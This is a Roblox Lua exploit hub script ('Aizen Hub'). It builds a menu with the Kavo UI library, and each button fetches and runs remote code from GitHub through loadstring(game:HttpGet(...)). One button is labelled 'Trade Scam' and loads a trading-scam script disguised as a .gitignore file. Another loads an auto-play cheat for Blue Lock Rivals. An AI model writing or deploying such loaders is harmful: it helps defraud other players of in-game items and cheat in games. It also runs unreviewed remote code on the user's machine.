-- Load Kavo UI Library
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Aizen Hub", "Sentinel") -- Theme

-- Main Tab
local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Scripts")

-- **Colored Title**
Section:NewLabel("[🔹 Aizen Hub 🔹]")

-- **Close Button**
Section:NewButton("❌ Close UI", "Closes Aizen Hub", function()
    Library:ToggleUI()
end)

-- **Pop It Trading Script**
Section:NewButton("Pop It Trading", "Trade Scam", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Cooked-METHods/pop-it-trading-scam-script/main/.gitignore"))()
    print("Pop It Trading script executed!")
end)

-- **Blue Lock Rivals Script**
Section:NewButton("Blue Lock Rivals", "Auto Play Script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/game/main/TbaoHubBlueLockRivals"))()
    print("Blue Lock Rivals script executed!")
end)

-- **Draggable UI**
Library:ToggleUI() -- Auto-draggable on mobile & PC

print("✅ Universal Aizen Loaded Successfully!")
